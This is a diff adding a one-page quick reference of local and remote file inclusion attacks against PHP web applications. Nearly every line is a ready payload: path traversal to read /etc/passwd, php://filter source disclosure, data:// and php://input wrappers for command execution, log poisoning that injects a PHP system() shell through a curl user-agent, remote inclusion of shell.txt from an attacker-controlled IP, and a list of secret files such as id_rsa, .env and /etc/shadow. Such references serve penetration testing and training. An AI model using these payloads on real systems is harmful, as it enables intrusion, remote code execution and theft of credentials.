@@ -1,0 +1,9 @@
+LFI / RFI — QUICK REF
+
+Confirm LFI:  ?page=../../../../etc/passwd   |  ....//....//   |  ..%252f (double-enc)
+Read source:  ?page=php://filter/convert.base64-encode/resource=index.php  → base64 -d
+RCE (wrapper):?page=data://text/plain;base64,PD9waHA...&c=id  |  php://input (POST body)
+RCE (poison): curl -A '<?php system($_GET[c]);?>' target ; ?page=/var/log/apache2/access.log&c=id
+              sinks: nginx log, auth.log, /proc/self/environ, sess_<PHPSESSID>
+RFI:          ?page=http://<your-ip>/shell.txt&c=id   (allow_url_include=On)
+Reads:        config.php .env wp-config.php id_rsa /etc/shadow
